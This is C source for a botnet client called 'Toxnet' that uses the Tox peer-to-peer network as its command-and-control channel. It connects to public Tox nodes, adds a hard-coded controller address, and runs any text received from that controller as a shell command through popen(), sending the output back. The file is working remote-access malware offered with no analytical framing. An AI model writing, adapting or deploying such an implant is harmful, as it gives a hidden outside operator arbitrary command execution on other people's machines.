#include <ctype.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>

#include <sodium/utils.h>
#include <tox/tox.h>

// Set system information for C2 (test)
#if __linux__
    char * status = "LINUX";
#elif __unix__
    char * status = "UNIX";
#elif defined(_POSIX_VERSION)
    char * status = "POSIX";
#else
#   error "Unknown compiler"
#endif

typedef struct DHT_node {
    const char *ip;
    uint16_t port;
    const char key_hex[TOX_PUBLIC_KEY_SIZE*2 + 1];
} DHT_node;

char *c2id = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B8820182949B28C7FD69F"; // C2 Address
char *c2pub = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B88201829"; // C2 Public key

uint8_t * hex2bin(const char *hex) {
    size_t len = strlen(hex) / 2;
    uint8_t *bin = malloc(len);

    for (size_t i = 0; i < len; ++i, hex += 2) {
        sscanf(hex, "%2hhx", &bin[i]);
    }

    return bin;
}

char * bin2hex(const uint8_t *bin, size_t length) {
    char *hex = malloc(2 * length + 1);
    char *saved = hex;
    for (int i = 0; i < length; i++, hex += 2) {
        sprintf(hex, "%02X", bin[i]);
    }
    return saved;
}

void friend_message_cb(Tox *tox, uint32_t friend_num, TOX_MESSAGE_TYPE type, const uint8_t *message, size_t length, void *user_data) {

    uint8_t client_id[TOX_PUBLIC_KEY_SIZE];
    tox_friend_get_public_key(tox, friend_num, client_id, NULL);
    char *c2check = bin2hex(client_id, sizeof(client_id));

    if (strcmp(c2check, c2pub) == 0) {

        char *cmd, *admin;
        admin = strdup(message);
        admin = strtok(admin, " ");
        cmd = strtok(NULL, "");

        FILE *fp;
        uint8_t path[TOX_MAX_MESSAGE_LENGTH];
        fp = popen(cmd, "r");

        while (fgets(path, sizeof(path) - sizeof(admin) - 1, fp) != NULL) {
            strcat(path, admin);
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, path, strlen(path), NULL);
        }
        pclose(fp);
    }
}

void self_connection_status_cb(Tox *tox, TOX_CONNECTION connection_status, void *user_data) {
    switch (connection_status) {
        case TOX_CONNECTION_NONE:
            printf("Offline\n");
            break;
        case TOX_CONNECTION_TCP:
            printf("Online, using TCP\n");
            break;
        case TOX_CONNECTION_UDP:
            printf("Online, using UDP\n");
            break;
    }
}

int main() {
    Tox *tox = tox_new(NULL, NULL);

    const char *name = "Toxnet";
    tox_self_set_name(tox, name, strlen(name), NULL);
    tox_self_set_status_message(tox, status, strlen(status), NULL);

    DHT_node nodes[] =
    {
        {"85.143.221.42",                      33445, "DA4E4ED4B697F2E9B000EEFE3A34B554ACD3F45F5C96EAEA2516DD7FF9AF7B43"},
        {"2a04:ac00:1:9f00:5054:ff:fe01:becd", 33445, "DA4E4ED4B697F2E9B000EEFE3A34B554ACD3F45F5C96EAEA2516DD7FF9AF7B43"},
        {"78.46.73.141",                       33445, "02807CF4F8BB8FB390CC3794BDF1E8449E9A8392C5D3F2200019DA9F1E812E46"},
        {"2a01:4f8:120:4091::3",               33445, "02807CF4F8BB8FB390CC3794BDF1E8449E9A8392C5D3F2200019DA9F1E812E46"},
        {"tox.initramfs.io",                   33445, "3F0A45A268367C1BEA652F258C85F4A66DA76BCAA667A49E770BCC4917AB6A25"},
        {"tox2.abilinski.com",                 33445, "7A6098B590BDC73F9723FC59F82B3F9085A64D1B213AAF8E610FD351930D052D"},
        {"205.185.115.131",                       53, "3091C6BEB2A993F1C6300C16549FABA67098FF3D62C6D253828B531470B53D68"},
        {"tox.kurnevsky.net",                  33445, "82EF82BA33445A1F91A7DB27189ECFC0C013E06E3DA71F588ED692BED625EC23"}
    };

    for (size_t i = 0; i < sizeof(nodes)/sizeof(DHT_node); i ++) {
        unsigned char key_bin[TOX_PUBLIC_KEY_SIZE];
        sodium_hex2bin(key_bin, sizeof(key_bin), nodes[i].key_hex, sizeof(nodes[i].key_hex)-1, NULL, NULL, NULL);
        tox_bootstrap(tox, nodes[i].ip, nodes[i].port, key_bin, NULL);
    }

    uint8_t tox_id_bin[TOX_ADDRESS_SIZE];
    tox_self_get_address(tox, tox_id_bin);

    char tox_id_hex[TOX_ADDRESS_SIZE*2 + 1];
    sodium_bin2hex(tox_id_hex, sizeof(tox_id_hex), tox_id_bin, sizeof(tox_id_bin));

    for (size_t i = 0; i < sizeof(tox_id_hex)-1; i ++) {
        tox_id_hex[i] = toupper(tox_id_hex[i]);
    }

    tox_callback_friend_message(tox, friend_message_cb);
    tox_callback_self_connection_status(tox, self_connection_status_cb);
    tox_friend_add(tox, hex2bin(c2id), "Incoming", sizeof(9), NULL); // Add C2

    while (1) {
        tox_iterate(tox, NULL);
        usleep(tox_iteration_interval(tox) * 1000);
    }

    tox_kill(tox);

    return 0;
}
